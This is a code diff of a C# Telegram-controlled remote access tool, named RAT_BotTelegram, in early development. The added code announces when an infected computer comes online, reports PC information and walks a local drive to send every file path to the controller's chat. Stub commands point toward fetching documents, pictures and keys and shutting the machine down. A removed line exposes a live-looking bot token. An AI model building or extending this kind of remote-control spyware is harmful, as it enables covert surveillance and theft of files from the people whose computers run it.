@@ -5,16 +5,16 @@ using System.Linq;
 using System.Threading.Tasks;
 using Telegram.Bot;
 using Telegram.Bot.Args;
+using Telegram.Bot.Requests;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
 
 namespace RAT_BotTelegram {
     class Program {
         static CommandsFeatures fea = new CommandsFeatures();
-        private static readonly TelegramBotClient Bot = new TelegramBotClient("1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8");
-        private static string id = "";
+        private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);
+        // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
-
 
             // Copiar
             // Esconder
@@ -28,10 +28,11 @@ namespace RAT_BotTelegram {
             //Método que se ejecuta cuando se recibe un error
             Bot.OnReceiveError += BotOnReceiveError;
 
+            // Mensaje de conexión
+            Bot.SendTextMessageAsync(config.id, "==>>    Computer: SebastiánEPH is online    <<== ");
+
             // Escucha servidor
             Bot.StartReceiving();
-            Bot.SendTextMessageAsync(id, "PC info??");
-
             Console.ReadLine();
             Console.WriteLine("La maquina se lenvantó ");
             Bot.StopReceiving();
@@ -45,51 +46,29 @@ namespace RAT_BotTelegram {
             switch (message.Text.Split(' ').First()) {
                 //Enviar un inline keyboard con callback
                 case "/PC_Info":
-
-                    //Simula que el bot está escribiendo
-                    //await Bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
-                    //await Task.Delay(20);
-
-                    await Bot.SendTextMessageAsync(message.Chat.Id,"PC info??");
+                    await Bot.SendTextMessageAsync(config.id, fea.PC_Info());
                     break;
 
                 case "/GetDir_Document":
+                    await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
+                    string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
+                    //string[] authorsList = authors.Split(", ")
+                    foreach (var file in allfiles) {
+                        FileInfo info = new FileInfo(file);
+                        Console.WriteLine("File: " + info);
+                        await  Bot.SendTextMessageAsync(config.id, "File =>" + info);
+                        //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
+                     //await Bot.SendDocumentAsync(chatId: config.id,);
+                        //await Bot.SendDocumentAsync(
+                        //chatId: callbackQuery.Message.Chat.Id,
+                        //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
+                        //);
 
-                    var keyboardEjemplo2 = new InlineKeyboardMarkup(new[]
-                    {
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Keyboard",
-                            callbackData: "keyboard"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Reply",
-                            callbackData: "reply"),
-                    },
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Reenviar",
-                            callbackData: "reenviar"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Force reply",
-                            callbackData: "forceReply"),
-                    },
-                    new []
-                    {
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Texto con formato",
-                            callbackData: "formato"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Video",
-                            callbackData: "video"),
+
+                        // Do something with the Folder or just add them to a list via nameoflist.add();
+
                     }
-                });
-
-                    await Bot.SendTextMessageAsync(
-                        message.Chat.Id,
-                        "Elija una opción",
-                        replyMarkup: keyboardEjemplo2);
+                    await Bot.SendTextMessageAsync(config.id,"Elija una opción");
                     break;
 
                 case "/GetDir_Documentw":
@@ -125,10 +104,7 @@ namespace RAT_BotTelegram {
                     }
                 });
 
-                    await Bot.SendTextMessageAsync(
-                        message.Chat.Id,
-                        "Elija una opción",
-                        replyMarkup: keyboardEjemplo3);
+                    await Bot.SendTextMessageAsync(config.id,"Elija una opción",replyMarkup: keyboardEjemplo3);
                     break;
 
                 //Mensaje por default
@@ -165,11 +141,7 @@ namespace RAT_BotTelegram {
                     /Get_Document <Está en desarrollo>
                     /Get_Document <Está en desarrollo>";
 
-                    await Bot.SendTextMessageAsync(
-                        message.Chat.Id,
-                        text: usage,
-                        replyMarkup: new ReplyKeyboardRemove());
-
+                    await Bot.SendTextMessageAsync(config.id,text: usage,replyMarkup: new ReplyKeyboardRemove());
                     break;
             }
         }
@@ -302,20 +274,6 @@ namespace RAT_BotTelegram {
                 } else if (e.Message.Text == "/PC_Restart") {
                     Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
 
-                } else if (e.Message.Text == "/Get_Document") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Get_Music") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Get_Download") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Get_Videos") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Get_Pictures") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Get_Desktop") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-
-
                 } else if (e.Message.Text == "/GetDir_Document") {
                     /*
                     File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0064.mp4
@@ -341,59 +299,7 @@ namespace RAT_BotTelegram {
 
                     }
 
-                    //Bot.SendTextMessageAsync(e.Message.Chat.Id, string[] authorsList = authors.Split(", "));
-                } else if (e.Message.Text == "/GetDir_Music") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/GetDir_Download") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/GetDir_Videos") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/GetDir_Pictures") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/GetDir_Desktop") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-
-
-                } else if (e.Message.Text == "/Get_Key") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/Test") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/elseif") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/3") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, @" Use los siguientes comandos: 
-                    /PC_Info      <Obtiene información de la computadora>
-                    /PC_ShutDown  <Está en desarrollo>
-                    /PC_Restart   <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Music    <Está en desarrollo>
-                    /Get_Download <Está en desarrollo>
-                    /Get_Videos   <Está en desarrollo>
-                    /Get_Pictures <Está en desarrollo>
-                    /Get_Desktop  <Está en desarrollo>
-                    /Get_Key      <Está en desarrollo>
-
-                    /GetDir_Document <Obtiene toda la lista>
-                    /GetDir_Music    <Está en desarrollo>
-                    /GetDir_Download <Está en desarrollo>
-                    /GetDir_Videos   <Está en desarrollo>
-                    /GetDir_Pictures <Está en desarrollo>
-                    /Get_Desktop  <Está en desarrollo>
-                    /Get_Key      <Está en desarrollo>
-
-                    /Test         <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    ");
+         
                 }
 
 
